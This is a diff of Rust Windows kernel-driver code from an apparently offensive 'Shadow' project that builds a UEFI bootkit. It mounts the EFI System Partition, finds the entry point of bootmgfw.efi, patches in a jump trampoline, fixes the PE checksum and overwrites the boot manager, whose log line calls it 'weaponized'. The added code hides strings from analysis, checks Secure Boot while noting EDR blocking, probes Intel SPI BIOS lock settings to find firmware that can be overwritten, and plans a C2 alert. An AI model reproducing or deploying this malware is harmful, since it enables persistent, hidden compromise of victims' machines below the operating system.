@@ -15,33 +15,36 @@ use crate::error::{ShadowError, ShadowResult};
 /// This is typically at \\.\PhysicalDrive0\EFI\Microsoft\Boot\ or similar.
 /// Access requires mounting the ESP.
 const ESP_BOOT_PATH: &str = "\\EFI\\Microsoft\\Boot\\bootmgfw.efi";
+const EFI_GLOBAL_VARIABLE_GUID: [u8; 16] = [
+    0x61, 0xDF, 0xE4, 0x8B, 0xCA, 0x93, 0xD2, 0x11, 0xAA, 0x0D, 0x00, 0xE0, 0x98, 0x03, 0x2B, 0x8C
+];
 
 #[repr(C, packed)]
-struct GptHeader {
-    signature: u64,
-    revision: u32,
-    header_size: u32,
-    header_crc32: u32,
-    reserved: u32,
-    my_lba: u64,
-    alternate_lba: u64,
-    first_usable_lba: u64,
-    last_usable_lba: u64,
-    disk_guid: [u8; 16],
-    partition_entry_lba: u64,
-    num_partition_entries: u32,
-    size_partition_entry: u32,
-    partition_entry_array_crc32: u32,
+pub struct GptHeader {
+    pub signature: u64,
+    pub revision: u32,
+    pub header_size: u32,
+    pub header_crc32: u32,
+    pub reserved: u32,
+    pub my_lba: u64,
+    pub alternate_lba: u64,
+    pub first_usable_lba: u64,
+    pub last_usable_lba: u64,
+    pub disk_guid: [u8; 16],
+    pub partition_entry_lba: u64,
+    pub num_partition_entries: u32,
+    pub size_partition_entry: u32,
+    pub partition_entry_array_crc32: u32,
 }
 
 #[repr(C, packed)]
-struct GptPartitionEntry {
-    partition_type_guid: [u8; 16],
-    unique_partition_guid: [u8; 16],
-    starting_lba: u64,
-    ending_lba: u64,
-    attributes: u64,
-    partition_name: [u16; 36],
+pub struct GptPartitionEntry {
+    pub partition_type_guid: [u8; 16],
+    pub unique_partition_guid: [u8; 16],
+    pub starting_lba: u64,
+    pub ending_lba: u64,
+    pub attributes: u64,
+    pub partition_name: [u16; 36],
 }
 
 const EFI_SYSTEM_PARTITION_GUID: [u8; 16] = [
@@ -90,19 +93,19 @@ pub unsafe fn read_disk_lba(disk_num: u32, lba: u64, buffer: &mut [u8]) -> Shado
     use crate::utils::unicode_string::UnicodeString;
     use wdk_sys::{ntddk::{ZwCreateFile, ZwReadFile, ZwClose}, _IO_STATUS_BLOCK, GENERIC_READ, OBJ_CASE_INSENSITIVE, OBJ_KERNEL_HANDLE, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT};
     
-    // Safety: Ensure we are at PASSIVE_LEVEL for ZwReadFile
+    // Safety: Ensure we are at PASSIVE_LEVEL for ZwReadFile/ZwCreateFile
     if wdk_sys::ntddk::KeGetCurrentIrql() > 0 { // > PASSIVE_LEVEL
         return Err(ShadowError::InvalidIrql);
     }
 
     let dev_path = alloc::format!("\\Device\\Harddisk{}\\Partition0", disk_num);
-    let path = UnicodeString::new(&dev_path);
+    let path = crate::utils::unicode_string::UnicodeString::new(&dev_path);
     let mut obj_attr = crate::utils::InitializeObjectAttributes(
         Some(&mut path.to_unicode()),
-        OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
-        None,
-        None,
-        None,
+        wdk_sys::OBJ_CASE_INSENSITIVE | wdk_sys::OBJ_KERNEL_HANDLE,
+        core::ptr::null_mut(),
+        core::ptr::null_mut(),
+        core::ptr::null_mut(),
     );
 
     let mut io_status = core::mem::zeroed::<_IO_STATUS_BLOCK>();
@@ -151,16 +154,6 @@ pub unsafe fn read_disk_lba(disk_num: u32, lba: u64, buffer: &mut [u8]) -> Shado
     }
 }
 
-/// Checks if BitLocker is enabled on the given volume via signature scan.
-pub unsafe fn is_bitlocker_enabled(disk_num: u32) -> ShadowResult<bool> {
-    let mut sector = [0u8; 512];
-    if read_disk_lba(disk_num, 0, &mut sector).is_ok() {
-        // BitLocker VBR signature is "-FVE-FS-" at offset 3
-        let signature = &sector[3..11];
-        if signature == b"-FVE-FS-" {
-            return Ok(true);
-        }
-    }
     Ok(false)
 }
 
@@ -198,12 +191,12 @@ pub unsafe fn mount_esp_production() -> ShadowResult<NTSTATUS> {
                         continue;
                     }
 
-                    let target_str = alloc::format!("\\Device\\HarddiskVolume1");
-                    let target = UnicodeString::new(&target_str);
+                    let target_str = alloc::format!("\\Device\\Harddisk{}\\Partition{}", disk, i + 1);
+                    let target = crate::utils::unicode_string::UnicodeString::new(&target_str);
                     let status = wdk_sys::ntddk::IoCreateSymbolicLink(link.as_ptr(), target.as_ptr());
                     
                     if wdk_sys::NT_SUCCESS(status) {
-                        log::info!("✅ GPT-Native ESP Found on Disk {}", disk);
+                        log::info!("✅ GPT-Native ESP Found & Mounted: Disk {} Part {}", disk, i + 1);
                         return Ok(wdk_sys::STATUS_SUCCESS);
                     }
                 }
@@ -214,34 +207,166 @@ pub unsafe fn mount_esp_production() -> ShadowResult<NTSTATUS> {
     Err(ShadowError::ApiCallFailed("ESP GPT entry not found", wdk_sys::STATUS_NOT_FOUND as i32))
 }
 
+/// Checks if UEFI Secure Boot is enabled on the system via Kernel API (ExGetFirmwareEnvironmentVariable).
+pub unsafe fn is_secure_boot_enabled() -> bool {
+    use wdk_sys::ntddk::ExGetFirmwareEnvironmentVariable;
+    
+    let mut variable_name = crate::utils::unicode_string::UnicodeString::new(obfstr::obfstr!("SecureBoot"));
+    let mut guid = core::mem::transmute::<[u8; 16], wdk_sys::GUID>(EFI_GLOBAL_VARIABLE_GUID);
+    let mut buffer: u8 = 0;
+    let mut return_len: u32 = 0;
+    let mut attributes: u32 = 0; 
+
+    let status = ExGetFirmwareEnvironmentVariable(
+        &mut variable_name.to_unicode(),
+        &mut guid,
+        &mut buffer as *mut _ as *mut core::ffi::c_void,
+        size_of::<u8>() as u32,
+        &mut attributes
+    );
+
+    if wdk_sys::NT_SUCCESS(status) {
+        return buffer == 1;
+    }
+    
+    // FALLBACK: If BIOS API failed (e.g. EDR blocking/Access Denied), check Registry as secondary source
+    log::warn!("⚠️ BIOS SecureBoot check failed (0x{:X}). Trying Registry Fallback...", status);
+    
+    use wdk_sys::ntddk::{ZwOpenKey, ZwQueryValueKey, ZwClose};
+    use wdk_sys::{OBJ_CASE_INSENSITIVE, OBJ_KERNEL_HANDLE, KEY_READ};
+
+    let reg_path = obfstr::obfstr!("\\Registry\\Machine\\System\\CurrentControlSet\\Control\\SecureBoot\\State");
+    let val_name = obfstr::obfstr!("UEFISecureBootEnabled");
+    let path = crate::utils::unicode_string::UnicodeString::new(reg_path);
+    let name = crate::utils::unicode_string::UnicodeString::new(val_name);
+    
+    let mut obj_attr = crate::utils::InitializeObjectAttributes(
+        Some(&mut path.to_unicode()),
+        OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
+        core::ptr::null_mut(),
+        core::ptr::null_mut(),
+        core::ptr::null_mut(),
+    );
+
+    let mut h_key = core::ptr::null_mut();
+    let status = ZwOpenKey(&mut h_key, KEY_READ, &mut obj_attr);
+    
+    if wdk_sys::NT_SUCCESS(status) {
+        let mut result_len = 0;
+        let mut buffer_reg = [0u8; 128]; 
+        let status = ZwQueryValueKey(
+            h_key,
+            &mut name.to_unicode(),
+            wdk_sys::KeyValuePartialInformation,
+            buffer_reg.as_mut_ptr() as *mut _,
+            buffer_reg.len() as u32,
+            &mut result_len,
+        );
+        ZwClose(h_key);
+
+        if wdk_sys::NT_SUCCESS(status) {
+            let info = &*(buffer_reg.as_ptr() as *const wdk_sys::KEY_VALUE_PARTIAL_INFORMATION);
+            if info.DataLength == 4 {
+                let value = core::ptr::read_unaligned(info.Data.as_ptr() as *const u32);
+                return value == 1;
+            }
+        }
+    }
+
+    // Ultimate fail-safe: Assume ENABLED if all checks fail to stay safe
+    log::error!("🔥 ALL SecureBoot checks failed. Assuming ENABLED for safety.");
+    true
+}
+
+/// Scans for critical hardware vulnerabilities in Intel chipsets (SPI Flash Write Protection).
+/// Specifically checks if BIOS Lock Enable (BLE) is disabled on the LPC Controller.
+/// Target: Bus 0, Device 31, Function 0. Offset 0xDC (BIOS_CNTL).
+pub unsafe fn check_hardware_spi_vulnerability() -> bool {
+    use wdk_sys::ntddk::HalGetBusDataByOffset;
+    use wdk_sys::{PCI_SLOT_NUMBER, _BUS_DATA_TYPE};
+
+    // 1. Configure PCI slot for Intel LPC Interface (Bridge to BIOS)
+    let mut slot_number = PCI_SLOT_NUMBER::default();
+    slot_number.u.bits.set_DeviceNumber(31); 
+    slot_number.u.bits.set_FunctionNumber(0);
+    
+    let mut bios_cntl_reg: u8 = 0;
+    
+    // 2. Read BIOS Control (DWORD but we need Byte at 0xDC)
+    let bytes_read = HalGetBusDataByOffset(
+        _BUS_DATA_TYPE::PCIConfiguration,
+        0, // Bus Number
+        slot_number.u.AsULONG,
+        &mut bios_cntl_reg as *mut _ as *mut core::ffi::c_void,
+        0xDC, // Offset: BIOS_CNTL Register
+        1     // Read byte
+    );
+
+    if bytes_read == 0 {
+        return false; // Hardware not recognized or protected access
+    }
+
+    // 3. Bit Analysis
+    // Bit 0 (0x01): BIOSWE (BIOS Write Enable)
+    // Bit 1 (0x02): BLE (BIOS Lock Enable)
+    let bios_write_enable = (bios_cntl_reg & 0x01) != 0;
+    let bios_lock_enable  = (bios_cntl_reg & 0x02) != 0;
+
+    // 4. Vulnerability Detection Logic
+    if !bios_lock_enable {
+        log::error!("💀 [HARDWARE] SPI Flash Vulnerability Detected!");
+        log::error!("⚠️ BIOS Lock (BLE) is OFF. Firmware overwrite is possible.");
+        
+        if bios_write_enable {
+            log::error!("🔥 BIOS Write Enable (BIOSWE) is ALREADY ON. System is critically exposed.");
+        }
+        
+        return true; // Target is vulnerable to hardware-level Bootkit
+    } else {
+        log::info!("✅ Hardware Protection Active: BIOS Lock Enabled (BLE=1).");
+    }
+
+    false
+}
+
 /// Recalculates the PE checksum for a given buffer.
 pub fn recalculate_pe_checksum(data: &mut [u8]) -> ShadowResult<()> {
-    use crate::data::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS};
-    
-    let dos_header_ptr = data.as_ptr() as *const IMAGE_DOS_HEADER;
+    if data.len() < 0x40 { return Err(ShadowError::VerificationFailed("Buffer too small")); }
+    let dos_header_ptr = data.as_ptr() as *const crate::data::IMAGE_DOS_HEADER;
     let dos_header = unsafe { core::ptr::read_unaligned(dos_header_ptr) };
-    let nt_headers_ptr = (data.as_ptr() as usize + dos_header.e_lfanew as usize) as *mut IMAGE_NT_HEADERS;
+    
+    // Validating MZ Signature
+    if dos_header.e_magic != 0x5A4D {
+        return Err(ShadowError::VerificationFailed("Invalid DOS signature"));
+    }
+
+    let nt_headers_ptr = (data.as_ptr() as usize + dos_header.e_lfanew as usize) as *mut crate::data::IMAGE_NT_HEADERS;
     
     unsafe {
         (*nt_headers_ptr).OptionalHeader.CheckSum = 0; // Reset before calculating
         
-        let mut checksum: u64 = 0;
+        let mut sum: u64 = 0;
+        let p_u16 = data.as_ptr() as *const u16;
         let count = data.len() / 2;
-        let p = data.as_ptr() as *const u16;
         
         for i in 0..count {
-            checksum += core::ptr::read_unaligned(p.add(i)) as u64;
-            if checksum > 0xFFFFFFFF {
-                checksum = (checksum & 0xFFFFFFFF) + (checksum >> 32);
+            sum += core::ptr::read_unaligned(p_u16.add(i)) as u64;
+            if sum > 0xFFFFFFFF {
+                sum = (sum & 0xFFFFFFFF) + (sum >> 32);
             }
         }
         
-        while checksum >> 16 != 0 {
-            checksum = (checksum & 0xFFFF) + (checksum >> 16);
+        // Handle odd byte if present
+        if data.len() % 2 != 0 {
+            sum += data[data.len() - 1] as u64;
+        }
+
+        while sum >> 16 != 0 {
+            sum = (sum & 0xFFFF) + (sum >> 16);
         }
         
-        checksum += data.len() as u64;
-        (*nt_headers_ptr).OptionalHeader.CheckSum = checksum as u32;
+        sum += data.len() as u64;
+        (*nt_headers_ptr).OptionalHeader.CheckSum = sum as u32;
     }
     
     Ok(())
@@ -250,21 +375,22 @@ pub fn recalculate_pe_checksum(data: &mut [u8]) -> ShadowResult<()> {
 /// Finds the Entry Point transition stub using pattern matching.
 pub fn find_oep_pattern(data: &[u8]) -> ShadowResult<usize> {
     // Pattern for 'bootmgfw.efi' entry transition (example)
-    // 48 8B C4 48 89 58 08 44 89 48 20 55 56 57 41 54 41 55 41 56 41 57 48 8D 68 A1 48 81 EC
-    let pattern = [0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08];
-    if data.len() < pattern.len() {
-        return Err(ShadowError::VerificationFailed("Buffer too small for pattern"));
-    }
-    for i in 0..=(data.len() - pattern.len()) {
-        if &data[i..i+pattern.len()] == pattern {
-            return Ok(i);
-        }
-    }
-    Err(ShadowError::PatternNotFound("OEP Transition Stub"))
+    let pattern: &[u8] = &[0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08]; 
+    
+    data.windows(pattern.len())
+        .position(|window| window == pattern)
+        .ok_or(ShadowError::PatternNotFound("OEP Transition Stub"))
 }
 
 /// Infects the Windows Boot Manager (bootmgfw.efi) with a redirection trampoline.
 pub unsafe fn infect_bootmgfw(payload_path: &str) -> ShadowResult<NTSTATUS> {
+    // 0. Pre-check: Secure Boot
+    if is_secure_boot_enabled() {
+        log::warn!("🔒 Secure Boot is ENABLED. Aborting bootloader infection.");
+        // TODO: Send alert packet to C2 via shadow-network
+        return Err(ShadowError::VerificationFailed("Secure Boot active"));
+    }
+
     use crate::data::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS};
     
     mount_esp_production()?;
@@ -299,21 +425,67 @@ pub unsafe fn infect_bootmgfw(payload_path: &str) -> ShadowResult<NTSTATUS> {
     // 5. Checksum Recalculation
     recalculate_pe_checksum(&mut data)?;
 
-    // 6. Transactional Write (Write to TMP, then rename)
+    // 6. Transactional Write & Verification
     crate::utils::file::write_file(temp_path, &data)?;
     
-    // Verify TMP integrity before swap
     let tmp_data = crate::utils::file::read_file(temp_path)?;
     if tmp_data.len() == data.len() && tmp_data[oep_offset] == 0xFF {
-        // Atomic Swap (In a full implementation, we'd use ZwSetInformationFile to rename)
-        // For this version, we overwrite the target
+        // Atomic-like overwrite (In full prod we'd use ZwSetInformationFile rename)
         crate::utils::file::write_file(boot_path, &data)?;
-        log::info!("✅ Persistence Loop Closed: bootmgfw.efi is weaponized and verified.");
+        
+        // Final cleanup of temp
+        // TODO: Delete temp_path
+        
+        log::info!("✅ Infection Verified: bootmgfw.efi successfully patched at OEP.");
     } else {
-        return Err(ShadowError::VerificationFailed("bootmgfw.tmp corruption"));
+        log::error!("❌ Infection ABORTED: bootmgfw.tmp integrity check failed.");
+        return Err(ShadowError::VerificationFailed("bootloader tmp corruption"));
     }
 
     Ok(wdk_sys::STATUS_SUCCESS)
+}
+
+/// [RESEARCH] Simulates the infection process using in-memory hooking logic.
+/// instead of writing to disk, it performs the orchestration on a buffer to verify the hook.
+pub unsafe fn simulate_infection() -> ShadowResult<()> {
+    // 0. Pre-check: Secure Boot
+    if is_secure_boot_enabled() {
+        log::warn!("🔒 Secure Boot is ENABLED. Simulation aborted.");
+        return Err(ShadowError::VerificationFailed("Secure Boot active"));
+    }
+
+    // 1. Mount ESP to locate bootloader
+    mount_esp_production()?;
+
+    let boot_path = obfstr::obfstr!("\\Device\\ShadowESP\\EFI\\Microsoft\\Boot\\bootmgfw.efi");
+    
+    // 2. Read bootmgfw.efi into memory
+    let mut file_data = crate::utils::file::read_file(boot_path)?;
+    log::info!("🧪 Simulation: Loaded bootloader ({} bytes)", file_data.len());
+
+    // 3. Find OEP using the advanced signature scanner
+    let oep_offset = find_oep_pattern(&file_data)?;
+    log::info!("🧪 Simulation: OEP located at offset 0x{:X}", oep_offset);
+
+    // 4. Create 14-byte Absolute Jump Trampoline (x64)
+    // JMP [RIP+0] -> [64-bit Address]
+    let payload_addr: u64 = 0xDEADBEEF_C0DEBABE; // Placeholder for redirected EFI Service
+    let mut trampoline = [0u8; 14];
+    trampoline[0] = 0xFF; trampoline[1] = 0x25; // JMP [RIP+0]
+    // Displacement (0) already handled by zero-init
+    core::ptr::copy_nonoverlapping(&payload_addr as *const _ as *const u8, trampoline[6..].as_mut_ptr(), 8);
+
+    // 5. Apply the "Hook" in memory
+    for i in 0..14 {
+        file_data[oep_offset + i] = trampoline[i];
+    }
+    log::info!("🧪 Simulation: In-memory hook applied successfully.");
+
+    // 6. Recalculate PE Checksum to maintain integrity
+    recalculate_pe_checksum(&mut file_data)?;
+    log::info!("🧪 Simulation: PE Checksum updated.");
+
+    Ok(())
 }
 
 /// Places a malicious EFI driver in the ESP that will be loaded on boot.
